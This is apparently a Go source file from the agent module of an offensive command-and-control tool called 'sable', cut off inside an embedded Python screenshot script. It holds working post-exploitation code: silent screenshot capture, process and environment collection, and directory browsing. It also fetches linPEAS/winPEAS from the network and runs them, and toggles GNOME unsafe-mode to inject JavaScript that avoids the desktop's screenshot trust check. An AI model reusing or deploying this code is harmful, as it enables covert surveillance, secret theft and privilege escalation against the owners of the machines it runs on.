package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

var backgroundTasks sync.Map

const (
	situationalTimeout        = 20 * time.Second
	maxSituationalOutputBytes = 48 * 1024
	maxScreenshotBytes        = 50 * 1024 * 1024
	peasTimeout               = 10 * time.Minute
	maxPEASToolBytes          = 5 * 1024 * 1024
	maxPEASOutputBytes        = 8 * 1024 * 1024
)

const (
	linPEASURL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
	winPEASURL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"
)

// gnomeWaylandCmdTimeout is a shorter timeout for the individual gsettings/gdbus
// calls inside captureScreenshotGNOMEWayland — each step should complete quickly.
const gnomeWaylandCmdTimeout = 6 * time.Second

type fileArtifactResult struct {
	MIME     string `json:"mime"`
	Filename string `json:"filename"`
	Data     string `json:"data"`
}

type cappedBuffer struct {
	buf       bytes.Buffer
	limit     int
	truncated bool
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	if b.limit <= 0 {
		b.truncated = true
		return len(p), nil
	}
	remaining := b.limit - b.buf.Len()
	if remaining <= 0 {
		b.truncated = true
		return len(p), nil
	}
	if len(p) > remaining {
		b.buf.Write(p[:remaining]) //nolint:errcheck
		b.truncated = true
		return len(p), nil
	}
	return b.buf.Write(p)
}

func encodeTextArtifact(filename, text string) (string, string) {
	result := fileArtifactResult{
		MIME:     "text/plain; charset=utf-8",
		Filename: filename,
		Data:     base64.StdEncoding.EncodeToString([]byte(text)),
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

func runReadOnlyCommand(timeout time.Duration, name string, args ...string) (string, string) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, name, args...)
	var out cappedBuffer
	out.limit = maxSituationalOutputBytes
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	text := strings.TrimRight(out.buf.String(), "\r\n")
	if out.truncated {
		text += fmt.Sprintf("\n[output truncated at %d bytes]", maxSituationalOutputBytes)
	}
	if ctx.Err() == context.DeadlineExceeded {
		return text, "command timed out"
	}
	if err != nil {
		return text, err.Error()
	}
	return text, ""
}

func listProcesses() (string, string) {
	switch runtime.GOOS {
	case "windows":
		return runReadOnlyCommand(situationalTimeout, "tasklist.exe", "/FO", "CSV", "/V")
	case "darwin":
		return runReadOnlyCommand(situationalTimeout, "ps", "-axo", "pid,ppid,user,stat,comm,args")
	default:
		return runReadOnlyCommand(situationalTimeout, "ps", "-eo", "pid,ppid,user,stat,comm,args", "--sort=pid")
	}
}

func captureScreenshot() (string, string) {
	var data []byte
	var err error

	switch runtime.GOOS {
	case "windows":
		data, err = captureScreenshotWindows()
	case "darwin":
		data, err = captureScreenshotDarwin()
	default:
		data, err = captureScreenshotLinux()
	}
	if err != nil {
		return "", err.Error()
	}
	if len(data) == 0 {
		return "", "screenshot command returned no image data"
	}
	if len(data) > maxScreenshotBytes {
		return "", fmt.Sprintf("screenshot exceeds bounded limit: %d bytes (max %d)", len(data), maxScreenshotBytes)
	}
	mime, ext := detectImageType(data)

	result := fileArtifactResult{
		MIME:     mime,
		Filename: "screenshot_" + time.Now().UTC().Format("20060102_150405") + ext,
		Data:     base64.StdEncoding.EncodeToString(data),
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

func startPEASTask(taskID string) *protocol.TaskResult {
	plan, err := peasPlan()
	if err != nil {
		return &protocol.TaskResult{TaskID: taskID, Type: "peas", Error: err.Error()}
	}

	atomic.AddInt32(&backgroundTaskCount, 1)
	ctx, cancel := context.WithCancel(context.Background())
	backgroundTasks.Store(taskID, cancel)
	go func() {
		defer backgroundTasks.Delete(taskID)
		defer atomic.AddInt32(&backgroundTaskCount, -1)
		runPEASWithProgress(ctx, taskID, plan)
	}()

	return &protocol.TaskResult{
		TaskID: taskID + "-peas-started",
		Type:   "peas_progress",
		Output: fmt.Sprintf("[peas] %s selected for %s/%s. Background execution started.", plan.name, runtime.GOOS, runtime.GOARCH),
	}
}

func runPEASWithProgress(ctx context.Context, taskID string, plan *peasExecutionPlan) {
	output, taskErr := runPEAS(ctx, plan, func(message string) {
		queueAsyncProgress(taskID, message)
	})
	if taskErr != "" {
		queueAsyncProgress(taskID, "[peas] failed: "+taskErr)
		queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "peas", Error: taskErr, Output: output})
		return
	}
	queueAsyncProgress(taskID, "[peas] text artifact ready; Save Output will appear next")
	queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "peas", Output: output})
}

func runPEAS(parent context.Context, plan *peasExecutionPlan, progress func(string)) (string, string) {
	tmpDir, err := os.MkdirTemp("", "sable-peas-*")
	if err != nil {
		return "", err.Error()
	}
	defer os.RemoveAll(tmpDir) //nolint:errcheck

	toolPath := filepath.Join(tmpDir, plan.filename)
	source := plan.url
	progress(fmt.Sprintf("[peas] checking embedded %s cache", plan.name))
	embedded, err := writeEmbeddedPEASTool(plan, toolPath)
	if err != nil {
		return "", err.Error()
	}
	if embedded {
		source = "embedded:" + plan.filename
		progress(fmt.Sprintf("[peas] using embedded %s: %s", plan.name, plan.filename))
	} else {
		progress(fmt.Sprintf("[peas] downloading %s from %s", plan.name, plan.url))
		if err := downloadPEASTool(parent, plan.url, toolPath); err != nil {
			return "", err.Error()
		}
		progress(fmt.Sprintf("[peas] download complete: %s", plan.filename))
	}
	if runtime.GOOS != "windows" {
		if err := os.Chmod(toolPath, 0700); err != nil {
			return "", err.Error()
		}
	}

	progress(fmt.Sprintf("[peas] executing %s; output is being captured", plan.name))
	output, taskErr := executePEASTool(parent, plan, toolPath, source, progress)
	if taskErr != "" {
		output = strings.TrimRight(output, "\r\n") + "\n[runner error] " + taskErr + "\n"
	}
	if strings.TrimSpace(output) == "" {
		output = "[no output captured]\n"
	}

	progress("[peas] execution finished; preparing text artifact")
	return encodeTextArtifact(plan.outputFilename, output)
}

func cancelBackgroundTask(taskID string) (string, string) {
	value, ok := backgroundTasks.Load(taskID)
	if !ok {
		return "", "no running background task with id " + taskID
	}
	cancel, ok := value.(context.CancelFunc)
	if !ok {
		return "", "background task cancellation unavailable"
	}
	cancel()
	return "cancellation requested for " + taskID, ""
}

type peasExecutionPlan struct {
	name           string
	url            string
	filename       string
	outputFilename string
	command        string
	args           []string
}

func peasPlan() (*peasExecutionPlan, error) {
	ts := time.Now().UTC().Format("20060102_150405")
	switch runtime.GOOS {
	case "windows":
		return &peasExecutionPlan{
			name:           "winPEAS",
			url:            winPEASURL,
			filename:       "winPEAS.bat",
			outputFilename: "winpeas_" + ts + ".txt",
			command:        "cmd.exe",
			args:           []string{"/C"},
		}, nil
	case "linux":
		return &peasExecutionPlan{
			name:           "LinPEAS",
			url:            linPEASURL,
			filename:       "linpeas.sh",
			outputFilename: "linpeas_" + ts + ".txt",
			command:        "/bin/sh",
		}, nil
	case "darwin":
		return &peasExecutionPlan{
			name:           "LinPEAS",
			url:            linPEASURL,
			filename:       "linpeas.sh",
			outputFilename: "linpeas_darwin_" + ts + ".txt",
			command:        "/bin/sh",
		}, nil
	default:
		return nil, fmt.Errorf("PEAS is not configured for %s", runtime.GOOS)
	}
}

func downloadPEASTool(parent context.Context, url, dst string) error {
	ctx, cancel := context.WithTimeout(parent, situationalTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("download PEAS: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download PEAS: server returned %d", resp.StatusCode)
	}

	data, err := io.ReadAll(io.LimitReader(resp.Body, maxPEASToolBytes+1))
	if err != nil {
		return fmt.Errorf("read PEAS download: %w", err)
	}
	if len(data) > maxPEASToolBytes {
		return fmt.Errorf("PEAS download exceeds limit of %d bytes", maxPEASToolBytes)
	}
	if len(data) == 0 {
		return fmt.Errorf("PEAS download returned empty body")
	}
	if err := os.WriteFile(dst, data, 0600); err != nil {
		return fmt.Errorf("write PEAS tool: %w", err)
	}
	return nil
}

func executePEASTool(parent context.Context, plan *peasExecutionPlan, toolPath, source string, progress func(string)) (string, string) {
	ctx, cancel := context.WithTimeout(parent, peasTimeout)
	defer cancel()

	args := append([]string{}, plan.args...)
	args = append(args, toolPath)
	cmd := exec.CommandContext(ctx, plan.command, args...)

	var out cappedBuffer
	out.limit = maxPEASOutputBytes
	cmd.Stdout = &out
	cmd.Stderr = &out

	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	var err error
	started := time.Now()
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case err = <-done:
			progress(fmt.Sprintf("[peas] %s process exited after %s", plan.name, time.Since(started).Round(time.Second)))
			goto finished
		case <-ticker.C:
			progress(fmt.Sprintf("[peas] %s still running for %s", plan.name, time.Since(started).Round(time.Second)))
		case <-ctx.Done():
			err = ctx.Err()
			<-done
			goto finished
		}
	}

finished:
	text := strings.TrimRight(out.buf.String(), "\r\n")
	if out.truncated {
		text += fmt.Sprintf("\n[output truncated at %d bytes]", maxPEASOutputBytes)
	}
	header := fmt.Sprintf("%s output collected at %s\nSource: %s\n\n", plan.name, time.Now().Format(time.RFC3339), source)
	text = header + text
	if ctx.Err() == context.DeadlineExceeded {
		return text, "PEAS timed out"
	}
	if ctx.Err() == context.Canceled {
		return text, "PEAS cancelled"
	}
	if err != nil {
		return text, err.Error()
	}
	return text, ""
}

func hostSnapshot() (string, string) {
	var b strings.Builder
	fmt.Fprintf(&b, "Host snapshot for %s/%s\nCollected at %s\n\n", runtime.GOOS, runtime.GOARCH, time.Now().Format(time.RFC3339))
	appendCommandPlan(&b, "Current user", currentUserCommand())
	appendCommandPlan(&b, "Network interfaces", networkCommand())
	appendCommandPlan(&b, "Routes", routesCommand())
	appendCommandPlan(&b, "Disk", diskCommand())
	appendCommandPlan(&b, "Environment", envCommand())
	return encodeTextArtifact("host_snapshot_"+time.Now().UTC().Format("20060102_150405")+".txt", b.String())
}

func appendCommandPlan(b *strings.Builder, title string, command []string) {
	if len(command) == 0 {
		fmt.Fprintf(b, "\n== %s ==\n(no command)\n", title)
		return
	}
	appendCommandSection(b, title, command[0], command[1:]...)
}

func currentUserCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"whoami.exe", "/all"}
	}
	return []string{"id"}
}

func networkCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"ipconfig.exe", "/all"}
	}
	return []string{"sh", "-c", "ip addr 2>/dev/null || ifconfig -a"}
}

func routesCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"route.exe", "print"}
	}
	return []string{"sh", "-c", "ip route 2>/dev/null || netstat -rn"}
}

func diskCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "Get-PSDrive -PSProvider FileSystem | Format-Table -AutoSize | Out-String -Width 220"}
	}
	return []string{"df", "-h"}
}

func envCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"cmd.exe", "/C", "set"}
	}
	return []string{"env"}
}

func listDirectory(path string) (string, string) {
	input := strings.TrimSpace(path)
	if input == "" {
		input = "."
	}
	absPath, err := filepath.Abs(input)
	if err != nil {
		return "", err.Error()
	}
	entries, err := os.ReadDir(absPath)
	if err != nil {
		return "", err.Error()
	}

	result := fileBrowserResult{
		Path:      absPath,
		Parent:    parentDirectory(absPath),
		Separator: string(os.PathSeparator),
		Entries:   make([]fileBrowserEntry, 0, len(entries)),
	}
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			result.Entries = append(result.Entries, fileBrowserEntry{
				Name:  entry.Name(),
				Path:  filepath.Join(absPath, entry.Name()),
				Error: err.Error(),
			})
			continue
		}
		result.Entries = append(result.Entries, fileBrowserEntry{
			Name:    entry.Name(),
			Path:    filepath.Join(absPath, entry.Name()),
			IsDir:   entry.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}
	sort.SliceStable(result.Entries, func(i, j int) bool {
		if result.Entries[i].IsDir != result.Entries[j].IsDir {
			return result.Entries[i].IsDir
		}
		return strings.ToLower(result.Entries[i].Name) < strings.ToLower(result.Entries[j].Name)
	})

	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

type fileBrowserResult struct {
	Path      string             `json:"path"`
	Parent    string             `json:"parent,omitempty"`
	Separator string             `json:"separator"`
	Entries   []fileBrowserEntry `json:"entries"`
}

type fileBrowserEntry struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time,omitempty"`
	Error   string `json:"error,omitempty"`
}

func parentDirectory(path string) string {
	parent := filepath.Dir(path)
	if parent == path || parent == "." {
		return ""
	}
	return parent
}


func detectImageType(data []byte) (string, string) {
	if len(data) >= 3 && data[0] == 0xff && data[1] == 0xd8 && data[2] == 0xff {
		return "image/jpeg", ".jpg"
	}
	if len(data) >= 8 &&
		data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4e && data[3] == 0x47 &&
		data[4] == 0x0d && data[5] == 0x0a && data[6] == 0x1a && data[7] == 0x0a {
		return "image/png", ".png"
	}
	return "application/octet-stream", ".bin"
}

func captureScreenshotDarwin() ([]byte, error) {
	path := filepath.Join(os.TempDir(), fmt.Sprintf("sable_screenshot_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(path) //nolint:errcheck

	if _, err := exec.LookPath("screencapture"); err != nil {
		return nil, fmt.Errorf("screencapture not available")
	}
	if out, taskErr := runReadOnlyCommand(situationalTimeout, "screencapture", "-x", "-t", "jpg", path); taskErr != "" {
		return nil, fmt.Errorf("%s: %s", taskErr, out)
	}
	if _, err := exec.LookPath("sips"); err == nil {
		runReadOnlyCommand(situationalTimeout, "sips", "-Z", "800", path) //nolint:errcheck
	}
	return os.ReadFile(path)
}

func captureScreenshotLinux() ([]byte, error) {
	base := filepath.Join(os.TempDir(), fmt.Sprintf("sable_screenshot_%d", time.Now().UnixNano()))
	png := base + ".png"
	defer os.Remove(png)           //nolint:errcheck
	defer os.Remove(base + ".jpg") //nolint:errcheck
	env := linuxScreenshotEnv()
	var failures []string

	// On Wayland, X11 tools only capture XWayland content, not native Wayland
	// windows. Run the GNOME Shell-based path first so it captures the full desktop.
	if envValue(env, "WAYLAND_DISPLAY") != "" {
		if data, err := captureScreenshotGNOMEWayland(png, env); err == nil && len(data) > 0 {
			return data, nil
		} else if err != nil {
			failures = append(failures, "gnome-wayland: "+err.Error())
		}
	}

	candidates := linuxScreenshotCandidates(base)
	for _, candidate := range candidates {
		if _, err := exec.LookPath(candidate[0]); err != nil {
			continue
		}
		out, taskErr := runReadOnlyCommandEnv(situationalTimeout, env, candidate[0], candidate[1:]...)
		if taskErr != "" {
			failures = append(failures, candidate[0]+": "+summarizeCommandFailure(taskErr, out))
			continue
		}
		candidatePath := candidate[len(candidate)-1]
		data, err := os.ReadFile(candidatePath)
		os.Remove(candidatePath) //nolint:errcheck
		if err == nil && len(data) > 0 {
			return data, nil
		}
		failures = append(failures, candidate[0]+": command completed but did not create an image")
	}

	// Detect GNOME 45+ Wayland: unsafe-mode removed means XGetImage on root also
	// returns BadMatch, so X11-based tools (scrot, maim, import) all fail too.
	gnome45Wayland := false
	for _, f := range failures {
		if strings.Contains(f, "unsafe-mode key absent") {
			gnome45Wayland = true
			break
		}
	}

	envSummary := linuxScreenshotEnvSummary(env)
	if len(failures) > 0 {
		msg := fmt.Sprintf("supported screenshot utilities failed: %s. %s", strings.Join(failures, "; "), envSummary)
		if envValue(env, "WAYLAND_DISPLAY") != "" {
			if gnome45Wayland {
				msg += ". GNOME 45+ Wayland: ensure python3-gi is installed (sudo apt install python3-gi) and xdg-desktop-portal is running"
			} else {
				msg += ". Install scrot or maim for XWayland capture (DISPLAY=" + envValue(env, "DISPLAY") + ")"
			}
		}
		return nil, fmt.Errorf("%s", msg)
	}
	noUtilMsg := "no supported screenshot utility found; install one of gnome-screenshot, scrot, grim, maim, ImageMagick import, xfce4-screenshooter, mate-screenshot, spectacle, or flameshot"
	if envValue(env, "WAYLAND_DISPLAY") != "" {
		if gnome45Wayland {
			noUtilMsg += ". GNOME 45+ Wayland: ensure python3-gi is installed (sudo apt install python3-gi) and xdg-desktop-portal is running"
		} else {
			noUtilMsg += ". On Wayland with XWayland available (DISPLAY=" + envValue(env, "DISPLAY") + "), scrot and maim work without extra configuration"
		}
	}
	return nil, fmt.Errorf("%s", noUtilMsg)
}

// captureScreenshotGNOMEWayland captures the full GNOME Wayland desktop by
// injecting screenshot code into GNOME Shell via Shell.Eval (requires unsafe-mode).
// Unlike external D-Bus callers, code running inside the compositor has access
// to the full composited frame and is not subject to the session-trust check.
func captureScreenshotGNOMEWayland(png string, env []string) ([]byte, error) {
	if _, err := exec.LookPath("gsettings"); err != nil {
		return nil, fmt.Errorf("gsettings not available")
	}
	if _, err := exec.LookPath("gdbus"); err != nil {
		return nil, fmt.Errorf("gdbus not available")
	}

	// unsafe-mode was removed in GNOME 45+. Shell.Eval is unavailable without it.
	unsafeModeOut, unsafeModeErr := runReadOnlyCommandEnv(gnomeWaylandCmdTimeout, env, "gsettings", "writable", "org.gnome.shell", "unsafe-mode")
	if unsafeModeErr != "" || strings.TrimSpace(unsafeModeOut) != "true" {
		// GNOME 45+: unsafe-mode is gone. Use the XDG Desktop Portal Screenshot
		// interface instead. python3-gi ships with the default Ubuntu GNOME desktop
		// and the portal takes a silent full-screen capture with interactive=false.
		if _, err := exec.LookPath("python3"); err == nil {
			out, taskErr := runReadOnlyCommandEnv(20*time.Second, env, "python3", "-c", python3PortalScreenshot, png)
			if taskErr == "" {
				if data, err := os.ReadFile(png); err == nil && len(data) > 0 {
					return data, nil
				}
				return nil, fmt.Errorf("GNOME Shell screenshot not available: unsafe-mode key absent (GNOME 45+); xdg-portal: script succeeded but wrote no image")
			}
			return nil, fmt.Errorf("GNOME Shell screenshot not available: unsafe-mode key absent (GNOME 45+); xdg-portal: %s", summarizeCommandFailure(taskErr, out))
		}
		return nil, fmt.Errorf("GNOME Shell screenshot not available: unsafe-mode key absent (GNOME 45+); python3 not found")
	}

	// unsafe-mode enables org.gnome.Shell.Eval which runs JS inside the compositor.
	runReadOnlyCommandEnv(gnomeWaylandCmdTimeout, env, "gsettings", "set", "org.gnome.shell", "unsafe-mode", "true")
	defer runReadOnlyCommandEnv(gnomeWaylandCmdTimeout, env, "gsettings", "set", "org.gnome.shell", "unsafe-mode", "false") //nolint:errcheck

	// GNOME Shell processes the GSettings change asynchronously via its main loop.
	// Wait for it to apply before making any Eval calls, otherwise they are denied.
	time.Sleep(600 * time.Millisecond)

	// Record the time before any screenshot attempt so gnomeWaylandWaitFile can
	// distinguish files we created from pre-existing ones in the Pictures folder.
	before := time.Now()

	// eval calls org.gnome.Shell.Eval and returns the raw gdbus output and error.
	eval := func(js string) (string, string) {
		return runReadOnlyCommandEnv(gnomeWaylandCmdTimeout, env,
			"gdbus", "call", "--session",
			"--dest", "org.gnome.Shell",
			"--object-path", "/org/gnome/Shell",
			"--method", "org.gnome.Shell.Eval", js)
	}

	// Attempt 1: direct D-Bus Screenshot — works on GNOME builds where unsafe-mode
	// relaxes the session-trust check on the Screenshot interface.
	runReadOnlyCommandEnv(gnomeWaylandCmdTimeout, env, //nolint:errcheck
		"gdbus", "call", "--session",
		"--dest", "org.gnome.Shell.Screenshot",
		"--object-path", "/org/gnome/Shell/Screenshot",
		"--method", "org.gnome.Shell.Screenshot.Screenshot",
		"false", "true", png)
	if data, err := os.ReadFile(png); err == nil && len(data) > 0 {
		os.Remove(png) //nolint:errcheck
		return data, nil
	}

	// Attempt 2: Shell.Eval with GNOME 42+ async JS API.
	// Signature: screenshot(include_cursor, callback) — no cancellable parameter.
	// screenshot_finish returns [success, GFile].
	//
	// We pump the GLib main loop from within the Eval so the async callback fires
	// before gdbus returns, letting us capture the actual save path. Status codes
	// returned by the JS:
	//   C  — Gio.File.copy() to our temp path succeeded
	//   S|<path> — screenshot saved but copy failed; <path> is GNOME's save location
	//   N|<ok>   — screenshot_finish returned ok=false
	//   E|<err>  — JS exception
	//   P        — 3-second main-loop pump timed out (callback fired after Eval returned)
	js42 := fmt.Sprintf(
		`(function(){`+
			`try{`+
			`var st='P';`+
			`global.screenshot.screenshot(false,function(src,res){`+
			`try{`+
			`var a=src.screenshot_finish(res);`+
			`if(a[0]&&a[1]){`+
			`var p=a[1].get_path()||'';`+
			`try{`+
			`const G=imports.gi.Gio;`+
			`a[1].copy(G.File.new_for_path(%q),1,null,null);`+
			`st='C';`+
			`}catch(e2){st='S|'+p;}`+
			`}else{st='N|'+a[0];}`+
			`}catch(e){st='E|'+e;}`+
			`});`+
			`var ctx=imports.gi.GLib.MainContext.default();`+
			`var t0=imports.gi.GLib.get_monotonic_time();`+
			`while(st==='P'&&imports.gi.GLib.get_monotonic_time()-t0<3000000)`+
			`{ctx.iteration(false)}`+
			`return st;`+
			`}catch(outerE){return 'OUTER|'+outerE;}`+
			`})()`, png)
	out42, taskErr42 := eval(js42)
	if taskErr42 == "" {
		status42 := gnomeEvalString(out42)
		if status42 == "C" {
			if data, err := os.ReadFile(png); err == nil && len(data) > 0 {
				os.Remove(png) //nolint:errcheck
				return data, nil
			}
		}
		if strings.HasPrefix(status42, "S|") {
			// Copy failed, but GNOME saved to its default path — read it directly.
			savedPath := strings.TrimPrefix(status42, "S|")
			if savedPath != "" {
				if data, err := os.ReadFile(savedPath); err == nil && len(data) > 0 {
					os.Remove(savedPath) //nolint:errcheck
					return data, nil
				}
			}
		}
		// "P" (pump timed out) or "C" file read failure: the callback may still
		// fire after Eval returned. Scan GNOME's default screenshot directories.
		if data := gnomeWaylandWaitFile(png, before, 5*time.Second); len(data) > 0 {
			return data, nil
		}
	}

	// Attempt 3: Shell.Eval with GNOME 40/41 four-arg JS API.
	// screenshot(include_cursor, flash, filename, callback) — writes directly to path.
	// The callback is called synchronously on GNOME <42.
	js40 := fmt.Sprintf(
		`(function(){`+
			`try{`+
			`var done=false;`+
			`global.screenshot.screenshot(false,false,%q,function(){done=true;});`+
			`var ctx=imports.gi.GLib.MainContext.default();`+
			`var t0=imports.gi.GLib.get_monotonic_time();`+
			`while(!done&&imports.gi.GLib.get_monotonic_time()-t0<2000000){ctx.iteration(false)}`+
			`return done?'D':'P';`+
			`}catch(outerE){return 'OUTER|'+outerE;}`+
			`})()`, png)
	out40, taskErr40 := eval(js40)
	if taskErr40 == "" {
		if gnomeEvalString(out40) == "D" {
			if data, err := os.ReadFile(png); err == nil && len(data) > 0 {
				os.Remove(png) //nolint:errcheck
				return data, nil
			}
		}
		if data := gnomeWaylandWaitFile(png, before, 3*time.Second); len(data) > 0 {
			return data, nil
		}
	}

	home, _ := os.UserHomeDir()
	var reasons []string
	if taskErr42 != "" {
		reasons = append(reasons, "eval(42): "+summarizeCommandFailure(taskErr42, out42))
	} else if st42 := gnomeEvalString(out42); strings.HasPrefix(st42, "OUTER|") {
		reasons = append(reasons, "eval(42): JS exception: "+strings.TrimPrefix(st42, "OUTER|"))
	} else {
		reasons = append(reasons, "eval(42): JS status="+st42+", no file written")
	}
	if taskErr40 != "" {
		reasons = append(reasons, "eval(40): "+summarizeCommandFailure(taskErr40, out40))
	} else if st40 := gnomeEvalString(out40); strings.HasPrefix(st40, "OUTER|") {
		reasons = append(reasons, "eval(40): JS exception: "+strings.TrimPrefix(st40, "OUTER|"))
	} else {
		reasons = append(reasons, "eval(40): JS status="+st40+", no file written")
	}
	reasons = append(reasons, "scanned "+home+"/Pictures/{Screenshots,}")
	return nil, fmt.Errorf("GNOME Shell screenshot failed (%s); install scrot for XWayland fallback", strings.Join(reasons, "; "))
}

// gnomeEvalString extracts the JS return value from gdbus Eval output.
// gdbus formats Shell.Eval results as: (boolean, 'value')
func gnomeEvalString(out string) string {
	start := strings.Index(out, "'")
	end := strings.LastIndex(out, "'")
	if start >= 0 && end > start {
		return out[start+1 : end]
	}
	return ""
}

// gnomeWaylandWaitFile polls expectedPath for up to timeout. If the file does
// not appear there, it also scans GNOME's default screenshot directories for any
// PNG file created after after — covering the case where GNOME 42 saves to
// "~/Pictures/Screenshot from YYYY-MM-DD HH-MM-SS.png" rather than our path.
func gnomeWaylandWaitFile(expectedPath string, after time.Time, timeout time.Duration) []byte {
	home, _ := os.UserHomeDir()
	scanDirs := []string{
		filepath.Join(home, "Pictures", "Screenshots"),
		filepath.Join(home, "Pictures"),
	}
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		time.Sleep(250 * time.Millisecond)
		if data, err := os.ReadFile(expectedPath); err == nil && len(data) > 0 {
			os.Remove(expectedPath) //nolint:errcheck
			return data
		}
		for _, dir := range scanDirs {
			entries, err := os.ReadDir(dir)
			if err != nil {
				continue
			}
			for _, e := range entries {
				if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".png") {
					continue
				}
				info, err := e.Info()
				if err != nil || !info.ModTime().After(after) {
					continue
				}
				p := filepath.Join(dir, e.Name())
				if data, err := os.ReadFile(p); err == nil && len(data) > 0 {
					os.Remove(p) //nolint:errcheck
					return data
				}
			}
		}
	}
	return nil
}

func runReadOnlyCommandEnv(timeout time.Duration, env []string, name string, args ...string) (string, string) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, name, args...)
	if len(env) > 0 {
		cmd.Env = env
	}
	var out cappedBuffer
	out.limit = maxSituationalOutputBytes
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	text := strings.TrimRight(out.buf.String(), "\r\n")
	if out.truncated {
		text += fmt.Sprintf("\n[output truncated at %d bytes]", maxSituationalOutputBytes)
	}
	if ctx.Err() == context.DeadlineExceeded {
		return text, "command timed out"
	}
	if err != nil {
		return text, err.Error()
	}
	return text, ""
}

func linuxScreenshotEnv() []string {
	env := os.Environ()
	if os.Getenv("DBUS_SESSION_BUS_ADDRESS") == "" && os.Getuid() >= 0 {
		busPath := fmt.Sprintf("/run/user/%d/bus", os.Getuid())
		if _, err := os.Stat(busPath); err == nil {
			env = append(env, "DBUS_SESSION_BUS_ADDRESS=unix:path="+busPath)
		}
	}
	if os.Getenv("DISPLAY") == "" {
		if _, err := os.Stat("/tmp/.X11-unix/X0"); err == nil {
			env = append(env, "DISPLAY=:0")
		}
	}
	return env
}

func linuxScreenshotEnvSummary(env []string) string {
	keys := []string{"DISPLAY", "WAYLAND_DISPLAY", "DBUS_SESSION_BUS_ADDRESS", "XDG_SESSION_TYPE", "XDG_CURRENT_DESKTOP"}
	values := make([]string, 0, len(keys))
	for _, key := range keys {
		value := envValue(env, key)
		if value == "" {
			value = "<empty>"
		}
		values = append(values, key+"="+value)
	}
	return "GUI environment: " + strings.Join(values, ", ")
}

func envValue(env []string, key string) string {
	prefix := key + "="
	for _, item := range env {
		if strings.HasPrefix(item, prefix) {
			return strings.TrimPrefix(item, prefix)
		}
	}
	return ""
}

func summarizeCommandFailure(taskErr, output string) string {
	output = strings.TrimSpace(output)
	if len(output) > 240 {
		output = output[:240] + "..."
	}
	if output == "" {
		return taskErr
	}
	return taskErr + ": " + output
}

// python3X11Screenshot captures the X11 root window via ctypes + libX11 and writes
// a PNG using only Python 3 stdlib. No extra packages required — libX11.so.6 is
// always present when DISPLAY/XWayland is available.
const python3X11Screenshot = `import ctypes,struct,zlib,sys,os
L=ctypes.CDLL('libX11.so.6')
L.XOpenDisplay.restype=ctypes.c_void_p
L.XDefaultScreen.restype=ctypes.c_int
L.XRootWindow.restype=ctypes.c_ulong
L.XDisplayWidth.restype=ctypes.c_int
L.XDisplayHeight.restype=ctypes.c_int
L.XGetImage.restype=ctypes.c_void_p
L.XSync.restype=ctypes.c_int
# Non-fatal error handler: prevents BadMatch/BadDrawable from aborting the process
EH=ctypes.CFUNCTYPE(ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p)
L.XSetErrorHandler(EH(lambda d,e:0))
class _I(ctypes.Structure):
 _fields_=[('w',ctypes.c_int),('h',ctypes.c_int),('xo',ctypes.c_int),('fmt',ctypes.c_int),('data',ctypes.c_void_p),('bo',ctypes.c_int),('bu',ctypes.c_int),('bbo',ctypes.c_int),('bp',ctypes.c_int),('dep',ctypes.c_int),('bpl',ctypes.c_int),('bpp',ctypes.c_int),('rm',ctypes.c_ulong),('gm',ctypes.c_ulong),('bm',ctypes.c_ulong)]
disp=os.environ.get('DISPLAY',':0').encode()
dp=L.XOpenDisplay(disp)
if not dp:sys.exit(1)
sc=L.XDefaultScreen(ctypes.c_void_p(dp));rt=L.XRootWindow(ctypes.c_void_p(dp),sc)
w=L.XDisplayWidth(ctypes.c_void_p(dp),sc);h=L.XDisplayHeight(ctypes.c_void_p(dp),sc)
im=L.XGetImage(ctypes.c_void_p(dp),rt,0,0,w,h,0xFFFFFFFF,2)
L.XSync(ctypes.c_void_p(dp),0)
if not im:sys.exit(1)
xi=ctypes.cast(im,ctypes.POINTER(_I)).contents;bpl=xi.bpl
raw=bytearray(ctypes.string_at(xi.data,bpl*h))
px=bytearray()
for y in range(h):px+=raw[y*bpl:y*bpl+w*4]
